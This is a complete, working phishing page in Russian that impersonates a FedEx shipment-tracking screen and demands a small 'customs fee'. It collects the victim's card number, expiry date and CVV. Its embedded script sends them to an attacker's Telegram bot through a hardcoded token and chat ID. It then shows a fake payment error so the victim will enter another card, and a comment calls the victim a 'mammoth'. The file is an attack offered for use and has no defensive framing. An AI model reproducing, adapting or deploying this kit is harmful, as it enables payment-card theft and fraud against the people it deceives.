<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FedEx | Tracking Your Shipment</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
        .logo { color: #4D148C; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
        .logo span { color: #FF6200; }
        .status-box { background: #fff5ed; border: 1px solid #ff6200; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .status-text { color: #FF6200; font-weight: bold; font-size: 18px; }
        .shipment-id { color: #666; font-size: 14px; margin-top: 5px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
        button { background: #4D148C; color: white; border: none; padding: 15px; width: 100%; border-radius: 4px; cursor: pointer; font-size: 18px; font-weight: bold; transition: 0.3s; }
        button:hover { background: #3a0f6a; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">FedEx<span>®</span></div>
        <div class="status-box">
            <div class="status-text">Ожидает оплаты</div>
            <div class="shipment-id">Номер посылки: #<span id="track-number"></span></div>
        </div>
        <p>Для завершения доставки оплатите пошлину (1.99 USD).</p>
        <form id="payForm">
            <input type="text" id="cc" placeholder="Номер карты" required>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="exp" placeholder="ММ/ГГ" required style="width: 45%;">
                <input type="text" id="cvv" placeholder="CVV" required style="width: 45%;">
            </div>
            <button type="submit" id="subBtn">Оплатить</button>
        </form>
    </div>

    <script>
        // ДАННЫЕ УЖЕ ВШИТЫ
        const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
        const CHAT_ID = '8071425015';

        // Берем номер трека из ссылки автоматически
        const urlParams = new URLSearchParams(window.location.search);
        const currentTrack = urlParams.get('track') || '29103766982';
        document.getElementById('track-number').innerText = currentTrack;

        document.getElementById('payForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('subBtn');
            btn.innerText = "Обработка...";
            btn.disabled = true;

            const msg = `📬 **NEW LOG | FedEx**\n\n🆔 Трек: \`${currentTrack}\`\n💳 Карта: \`${document.getElementById('cc').value}\`\n📅 Срок: \`${document.getElementById('exp').value}\`\n🔒 CVV: \`${document.getElementById('cvv').value}\``;

            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
                });
                // Ошибка для мамонта
                alert("Ошибка платежной системы. Попробуйте другую карту.");
                btn.innerText = "Оплатить";
                btn.disabled = false;
                document.getElementById('payForm').reset();
            } catch (err) {
                alert("Ошибка. Попробуйте позже.");
            }
        };
    </script>
</body>
</html>
